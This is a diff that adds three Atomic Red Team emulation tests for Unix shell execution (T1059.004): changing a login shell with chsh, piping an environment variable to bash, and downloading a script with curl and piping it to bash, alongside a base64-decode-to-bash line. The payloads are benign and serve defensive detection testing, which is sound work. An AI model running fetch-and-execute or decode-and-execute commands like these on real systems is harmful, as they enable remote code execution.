@@ -162,3 +162,71 @@ atomic_tests:
       echo "\$ART=$ART"
       echo -n "$ART" |base64 -d |/bin/bash
       unset ART 
+- name: Change login shell
+  auto_generated_guid: c7ac59cb-13cc-4622-81dc-6d2fee9bfac7
+  description: |
+    An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user. 
+  supported_platforms:
+    - linux
+  dependencies:
+  - description: |
+      chsh - change login shell, must be installed
+    prereq_command: |
+      if [ -f /usr/bin/chsh ]; then echo "exit 0"; else echo "exit 1"; exit 1; fi
+    get_prereq_command: |
+      echo "Automated installer not implemented yet, please install chsh manually"
+  executor:
+    name: bash
+    elevation_required: true 
+    command: |      
+      useradd -s /bin/bash art
+      cat /etc/passwd |grep ^art
+      chsh -s /bin/sh art
+      cat /etc/passwd |grep ^art
+    cleanup_command: | 
+      userdel art
+- name: Environment variable scripts
+  auto_generated_guid: bdaebd56-368b-4970-a523-f905ff4a8a51
+  description: |
+    An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash
+  supported_platforms:
+    - linux
+  executor:
+    name: bash
+    elevation_required: false 
+    command: |
+      export ART='echo "Atomic Red Team was here... T1059.004"'
+      echo $ART |/bin/bash
+    cleanup_command: | 
+      unset ART
+- name: Detecting pipe-to-shell
+  auto_generated_guid: fca246a8-a585-4f28-a2df-6495973976a1
+  description: |
+    An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.
+  supported_platforms:
+  - linux
+  input_arguments:
+    remote_url:
+      description: url of remote payload
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Check if running on a Debian based machine.
+    prereq_command: |
+      if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then echo "Debian"; else echo "NOT Debian"; exit 1; fi
+      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
+    get_prereq_command: |
+      apt update && apt install -y curl
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      cd /tmp
+      curl -s #{remote_url}
+      ls -la /tmp/art.txt
+      curl -s #{remote_url} |bash
+      ls -la /tmp/art.txt      
+    cleanup_command: |
+      rm /tmp/art.txt
